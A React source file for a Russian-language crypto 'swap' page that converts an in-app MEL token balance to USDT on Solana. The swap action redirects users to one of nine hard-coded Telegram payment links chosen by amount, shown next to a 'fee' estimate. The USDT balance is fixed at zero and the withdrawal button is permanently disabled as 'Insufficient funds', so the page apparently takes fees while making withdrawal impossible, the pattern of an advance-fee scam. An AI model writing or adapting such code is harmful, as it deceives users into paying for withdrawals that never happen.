import { Link } from "react-router-dom";
import "./Swap.css";
import React, { useState, useContext } from "react";
import UserContext from "../context/UserContext";
import melImage from "../components/DefaultCoin/photo_2024-03-28_23-01-05-transformed.png";
import usdtImage from "./c44b0a52b3c760a9934b4c47d13152c9.png";
import swapImage from "./8482621.png";

const Swap = () => {
  const { contextData } = useContext(UserContext);
  const { balance } = contextData;
  const [inputValue, setInputValue] = useState("");
  const [usdtValue, setUsdtValue] = useState("");
  const [isIconColored, setIsIconColored] = useState(false);
  const usdtBalance = 0;
  const usdt = 0.9149;
  const links = [
    "https://t.me/send?start=IVOEwneDUsCU",
    "https://t.me/send?start=IVhN43ZViQSr",
    "https://t.me/send?start=IV3vH2Fxifiz",
    "https://t.me/send?start=IVkRma723ONy",
    "https://t.me/send?start=IVLJHQedNca1",
    "https://t.me/send?start=IVSpq0FXNFLY",
    "https://t.me/send?start=IVkAtWrI1Hew",
    "https://t.me/send?start=IVOrcEdGXulS",
    "https://t.me/send?start=IVmRXsQQHWJT",
  ];
  

  // Функция для определения fee
  const calculateFee = () => {
    const value = parseFloat(inputValue);
    if (isNaN(value)) return ""; // Если значение не число, вернуть пустую строку

    if (value >= 0 && value < 47) {
      return "≈ 0.477-0.478";
    } else if (value >= 47 && value < 105) {
      return "≈ 0.478-0.561";
    } else if (value >= 105 && value < 197) {
      return "≈ 0.561-0.782";
    } else if (value >= 197 && value < 330) {
      return "≈ 0.782-0.898";
    } else if (value >= 330 && value < 408) {
      return "≈ 0.898-1.069";
    } else if (value >= 408 && value < 561) {
      return "≈ 1.069-1.192";
    } else if (value >= 561 && value < 620) {
      return "≈ 1.192-1.441";
    } else if (value >= 620 && value < 910) {
      return "≈ 1.441-3.002";
    } else if (value >= 910) {
      return "≈ 3.002-7.981";
    } else {
      return ""; // Добавьте дополнительные условия, если необходимо
    }
  };

  const getLinkByInputValue = () => {
    const value = parseFloat(inputValue);

    if (value >= 0 && value < 47) {
      return links[0];
    } else if (value >= 47 && value < 105) {
      return links[1];
    } else if (value >= 105 && value < 197) {
      return links[2];
    } else if (value >= 197 && value < 330) {
      return links[3];
    } else if (value >= 330 && value < 408) {
      return links[4];
    } else if (value >= 408 && value < 561) {
      return links[5];
    } else if (value >= 561 && value < 620) {
      return links[6];
    } else if (value >= 620 && value < 910) {
      return links[7];
    } else if (value >= 910) {
      return links[8];
    } else {
      return ""; // Добавьте дополнительные условия, если необходимо
    }
  };

  const fee = calculateFee();

  const handleBalanceClick = () => {
    setInputValue(balance.toFixed(6));
    const newUsdt = balance * usdt;
    setUsdtValue(newUsdt.toFixed(6));
  };

  const handleInputChange = (e) => {
    let newValue = e.target.value;
    // Проверка на ввод не более 6 знаков после запятой
    if (/^\d*\.?\d{0,6}$/.test(newValue)) {
      setInputValue(newValue);
      newValue = parseFloat(newValue);
      if (!isNaN(newValue)) {
        setUsdtValue((newValue * usdt).toFixed(6));
      } else {
        setUsdtValue(""); // Очищаем второе поле, если первое не является числом
      }
    } else if (newValue === "") {
      setInputValue("");
      setUsdtValue(""); // Очищаем второе поле, если первое пустое
    }
  };

  const handleUsdtInputChange = (e) => {
    let newValue = e.target.value;
    // Проверка на ввод не более 6 знаков после запятой
    if (/^\d*\.?\d{0,6}$/.test(newValue)) {
      setUsdtValue(newValue);
      newValue = parseFloat(newValue);
      if (!isNaN(newValue)) {
        setInputValue((newValue / usdt).toFixed(6));
      } else {
        setInputValue(""); // Очищаем первое поле, если второе не является числом
      }
    } else if (newValue === "") {
      setUsdtValue("");
      setInputValue(""); // Очищаем первое поле, если второе пустое
    }
  };

  // Функция для проверки, должна ли кнопка быть активной или нет
  const isButtonDisabled = () => {
    // Кнопка должна быть неактивной, если одно из полей пустое или inputValue больше balance
    return !inputValue || parseFloat(inputValue) > balance + 0.000001;
  };

  // Функция для обновления цвета иконки в зависимости от условий
  const updateIconColor = () => {
    if (isButtonDisabled()) {
      setIsIconColored(false); // Если кнопка неактивна, делаем иконку серой
    } else {
      setIsIconColored(true); // В противном случае, делаем иконку цветной
    }
  };

  // Вызываем функцию для обновления цвета иконки при изменении состояний
  React.useEffect(() => {
    updateIconColor();
  }, [inputValue, balance]);

  return (
    <div className="swap-page-container">
      <div className="swap-back-button">
        <Link to="/" className="swap-back-link">
          &lt; Назад
        </Link>
      </div>
      <div className="toptext">SWAP</div>
      <div className="balance-field">
        <img src={melImage} alt="MEL icon" className="icon-mell" />
        <span>{balance.toFixed(6)}</span>
        <span>🔄</span>
        <span>{usdtBalance.toFixed(6)}</span>
        <img src={usdtImage} alt="USDT icon" className="icon-usdt" />
      </div>
      <div className="balance-input">
        <label htmlFor="balanceInput" className="balance-label">
          <Link to="#" className="balance-link" onClick={handleBalanceClick}>
            max {balance.toFixed(2)} mell
          </Link>
        </label>
        <input
          type="text"
          id="balanceInput"
          placeholder="0"
          className="balance-in"
          value={inputValue}
          onChange={handleInputChange}
        />
      </div>
      <img
        src={swapImage}
        alt="Refresh Icon"
        className="refresh-icon"
        style={{ filter: isIconColored ? "none" : "grayscale(100%)" }}
        onClick={() => {
          if (!isButtonDisabled()) {
            // Если кнопка активна, можно выполнить действие
            // В данном случае, переход по ссылке
            const link = getLinkByInputValue();
            if (link) {
              window.location.href = link;
            }
          }
        }}
      />

      <div className="usdt-input">
        <label htmlFor="usdtInput" className="balance-label">
          fee {fee}
        </label>
        <input
          type="text"
          id="usdtInput"
          placeholder="0"
          className="usdt-in"
          value={usdtValue}
          onChange={handleUsdtInputChange}
        />
      </div>
      <div className="overtext">
        <p>
          <span className="overtext-left">Валюта:</span>
          <span className="overtext-right">Tether</span>
        </p>
        <p>
          <span className="overtext-left">Сеть:</span>
          <span className="overtext-right">Solana</span>
        </p>
        <p>
          <span className="overtext-left">Мин. сумма вывода:</span>
          <span className="overtext-right">0.3 USDT</span>
        </p>
      </div>

      <div class="area">
        <textarea
          id="areaInput"
          placeholder="Введите адрес для вывода"
          class="area-in"
        ></textarea>
        <button id="submitButton" disabled>
          Insufficient funds
        </button>
      </div>

      <div className="infotext">
        <p>
          *Не выводите средства напрямую на краудфандинговую платформу или ICO.
          Мы не сможем начислить на ваш счет токены от этой продажи.
        </p>
        <p>
          *Убедитесь, что вы ввели правильный адрес для вывода в USDT сети
          Solana. В противном случае средства могут быть утеряны.
        </p>
      </div>
    </div>
  );
};

export default Swap;
